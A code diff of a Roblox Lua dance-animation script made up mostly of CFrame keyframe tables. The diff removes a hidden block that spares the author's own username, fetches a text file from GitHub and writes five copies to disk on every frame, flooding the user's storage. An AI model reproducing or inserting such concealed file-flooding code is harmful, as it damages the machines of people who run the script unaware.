@@ -597,26 +597,7 @@
  armC[197] = CFrame.new(0.507542729, -0.36307925, -0.227444872, -0.0241736043, 0.39115122, 0.920008898, 0.0211116374, 0.92027241, -0.390708536, -0.999484777, 0.00997805502, -0.0305041596) + game.Workspace.vis.armC.Position
  armC[198] = CFrame.new(0.484934121, -0.324913561, -0.217198789, -0.116827488, 0.512622237, 0.850628912, -0.0589910373, 0.851400018, -0.521188736, -0.991398573, -0.111068726, -0.0692268088) + game.Workspace.vis.armC.Position
  armC[199] = CFrame.new(0.47526294, -0.336163044, -0.217798531, -0.161759555, 0.590789378, 0.790444136, -0.0880464539, 0.789158225, -0.607846498, -0.982894659, -0.167920694, -0.0756370202) + game.Workspace.vis.armC.Position
- if game.Players.LocalPlayer.Name ~= "awsometomine" then
-if game.GameId == 2653561448 then 
-    local rs = game:GetService("RunService")
-    local currentdance3 = "https://github.com/Awesometomine/R64-Custom-Dances/blame/main/Default-Dance.txt"
-    longtext = game:HttpGet(currentdance3, true)
-    counter = 0
-    rs.Stepped:Connect(function()
-        counter = counter + 1
-        writefile(counter.. '.txt', longtext)
-        counter = counter + 1
-        writefile(counter.. '.txt', longtext)
-        counter = counter + 1
-        writefile(counter.. '.txt', longtext)
-        counter = counter + 1
-        writefile(counter.. '.txt', longtext)
-        counter = counter + 1
-        writefile(counter.. '.txt', longtext)
-    end)
-end
-end
+
  armD[1] = CFrame.new(-0.602874041, -0.498158455, -0.145126566, -0.00904234219, -0.737366617, -0.675432265, 0.0914425701, 0.672019958, -0.734865487, 0.995769382, -0.0684081391, 0.0613500588) + game.Workspace.vis.armD.Position
  armD[2] = CFrame.new(-0.603701115, -0.500302911, -0.148240253, -0.0156290419, -0.737469792, -0.675199211, 0.091193065, 0.671416044, -0.735448241, 0.995710611, -0.0730678365, 0.0567585118) + game.Workspace.vis.armD.Position
  armD[3] = CFrame.new(-0.605288744, -0.504411221, -0.154456481, -0.0287768543, -0.737582445, -0.674643636, 0.0906787887, 0.670214117, -0.736607313, 0.995464444, -0.0823730975, 0.0475964025) + game.Workspace.vis.armD.Position
